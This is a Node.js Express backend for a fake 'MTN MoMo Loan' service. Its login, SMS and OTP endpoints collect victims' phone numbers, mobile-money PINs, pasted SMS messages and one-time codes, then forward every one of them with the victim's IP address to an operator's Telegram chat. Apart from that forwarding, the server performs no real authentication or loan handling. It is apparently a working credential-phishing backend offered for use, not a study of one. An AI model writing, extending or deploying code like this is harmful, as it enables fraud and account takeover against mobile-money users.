/* ============================================================
   MTN MoMo Loan — Backend
   - Stateless
   - Forwards login / SMS / OTP events to Telegram
   - No DB, no PIN storage
   ============================================================ */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();

/* ============================================================
   CONFIG (from Railway environment variables)
   ============================================================ */
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

/* ============================================================
   MIDDLEWARE
   ============================================================ */
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

/* Simple request log */
app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

/* ============================================================
   HELPERS
   ============================================================ */
function makeReference(prefix = 'REF') {
  const stamp = Date.now().toString(36).toUpperCase();
  const rand = crypto.randomBytes(3).toString('hex').toUpperCase();
  return `${prefix}-${stamp}-${rand}`;
}

function makeToken() {
  return crypto.randomBytes(24).toString('hex');
}

function escapeHtml(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️ Telegram env vars missing — message not sent.');
    return { ok: false, reason: 'missing_env' };
  }
  try {
    const res = await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const data = await res.json().catch(() => ({}));
    if (!data.ok) {
      console.warn('⚠️ Telegram error:', data.description || data);
      return { ok: false, reason: data.description || 'telegram_error' };
    }
    return { ok: true };
  } catch (err) {
    console.error('❌ Telegram fetch failed:', err.message);
    return { ok: false, reason: err.message };
  }
}

/* Basic validation */
function isValidPhone(phone) {
  return typeof phone === 'string' && /^\+?\d{8,15}$/.test(phone.replace(/\s/g, ''));
}

/* ============================================================
   HEALTH CHECK
   ============================================================ */
app.get('/', (_req, res) => {
  res.json({
    ok: true,
    service: 'momo-usersey-backend',
    time: new Date().toISOString()
  });
});

/* ============================================================
   POST /api/login
   Body: { phone, pin }
   Response: { ok: true, token }
   ============================================================ */
app.post('/api/login', async (req, res) => {
  try {
    const { phone = '', pin = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof pin !== 'string' || pin.length < 4) {
      return res.status(400).json({ ok: false, error: 'Invalid PIN' });
    }

    const token = makeToken();

    const message =
      `🔐 <b>MoMo Login Attempt</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔑 <b>PIN:</b> <code>${escapeHtml(pin)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n` +
      `🌍 <b>IP:</b> <code>${escapeHtml(req.ip || 'unknown')}</code>`;

    await sendTelegram(message);

    return res.json({ ok: true, token });
  } catch (err) {
    console.error('login error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/sms
   Body: { phone, token, sms }
   Response: { ok: true, reference }
   ============================================================ */
app.post('/api/sms', async (req, res) => {
  try {
    const { phone = '', token = '', sms = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof sms !== 'string' || sms.trim().length < 5) {
      return res.status(400).json({ ok: false, error: 'SMS text required' });
    }

    const reference = makeReference('SMS');

    const message =
      `📩 <b>Pasted SMS</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n\n` +
      `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>`;

    await sendTelegram(message);

    return res.json({ ok: true, reference });
  } catch (err) {
    console.error('sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/verify-otp
   Body: { phone, otp, sms, token }
   Response: { ok: true, reference }
   ============================================================ */
app.post('/api/verify-otp', async (req, res) => {
  try {
    const { phone = '', otp = '', sms = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }
    if (typeof otp !== 'string' || !/^\d{4,8}$/.test(otp)) {
      return res.status(400).json({ ok: false, error: 'Invalid OTP' });
    }

    const reference = makeReference('OTP');

    const message =
      `✅ <b>OTP Verified</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🔢 <b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
      `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}` +
      (sms ? `\n\n📝 <b>Linked SMS:</b>\n<pre>${escapeHtml(sms.slice(0, 400))}</pre>` : '');

    await sendTelegram(message);

    return res.json({ ok: true, reference });
  } catch (err) {
    console.error('verify-otp error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   POST /api/resend-sms
   Body: { phone }
   Response: { ok: true }
   ============================================================ */
app.post('/api/resend-sms', async (req, res) => {
  try {
    const { phone = '' } = req.body || {};

    if (!isValidPhone(phone)) {
      return res.status(400).json({ ok: false, error: 'Invalid phone number' });
    }

    const message =
      `🔁 <b>SMS Resend Requested</b>\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}`;

    await sendTelegram(message);

    return res.json({ ok: true });
  } catch (err) {
    console.error('resend-sms error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

/* ============================================================
   404 + ERROR HANDLERS
   ============================================================ */
app.use((_req, res) => {
  res.status(404).json({ ok: false, error: 'Not found' });
});

app.use((err, _req, res, _next) => {
  console.error('unhandled error:', err);
  res.status(500).json({ ok: false, error: 'Server error' });
});

/* ============================================================
   START
   ============================================================ */
app.listen(PORT, () => {
  console.log('====================================');
  console.log('💰 MTN MoMo Loan — backend running');
  console.log(`🚀 Port: ${PORT}`);
  console.log(`📨 Telegram configured: ${TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID ? 'YES' : 'NO — set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID'}`);
  console.log('====================================');
});
